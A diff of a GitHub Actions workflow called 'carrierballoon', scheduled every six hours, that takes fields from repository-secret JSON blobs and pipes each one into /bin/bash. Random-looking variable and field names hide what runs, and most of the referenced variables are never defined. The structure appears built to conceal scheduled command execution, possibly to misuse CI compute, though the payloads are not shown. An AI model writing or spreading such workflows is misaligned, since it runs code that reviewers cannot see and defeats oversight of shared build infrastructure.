@@ -1,32 +1,23 @@
 name: carrierballoon
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '43 2/6 * * *'
-jobs:  # 8041
+    - cron: '42 3/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: carrierballoon
         env:
-          k5729: ${{ secrets.k5729 }}
+          oj1490: ${{ secrets.oj1490 }}
         run: |
-          echo $k5729 | jq -r .y823 | /bin/bash
-          echo $g36 | jq -r .iw2817 | /bin/bash
-          echo $gl09068 | jq -r .xwhiv38339 | /bin/bash
-          echo $hal4731 | jq -r .pc4783 | /bin/bash
-          echo $pvrvk63842 | jq -r .p41 | /bin/bash
-          echo $aw5718 | jq -r .ighma905 | /bin/bash
-          echo $dmx5 | jq -r .s3417 | /bin/bash
-          echo $lks4515 | jq -r .vbz8 | /bin/bash
-          echo $eg8499 | jq -r .n15426 | /bin/bash
-          echo $ubeog4158 | jq -r .wqaw9265 | /bin/bash
-          echo $ee6406 | jq -r .zuvk402 | /bin/bash
-          echo $jqn63 | jq -r .u3 | /bin/bash
-          echo $jjhzw8077 | jq -r .x619 | /bin/bash
-          echo $say59476 | jq -r .shd87638 | /bin/bash
-          echo $xci01 | jq -r .fi7 | /bin/bash
-          echo $tmck1 | jq -r .aka079 | /bin/bash
-          echo $d281 | jq -r .x96 | /bin/bash
+          echo $oj1490 | jq -r .ycf4 | /bin/bash
+          echo $ud80 | jq -r .vi782 | /bin/bash
+          echo $jbmqi3384 | jq -r .o5 | /bin/bash
+          echo $xb60 | jq -r .jl384 | /bin/bash
+          echo $nypd9 | jq -r .ud7 | /bin/bash
 
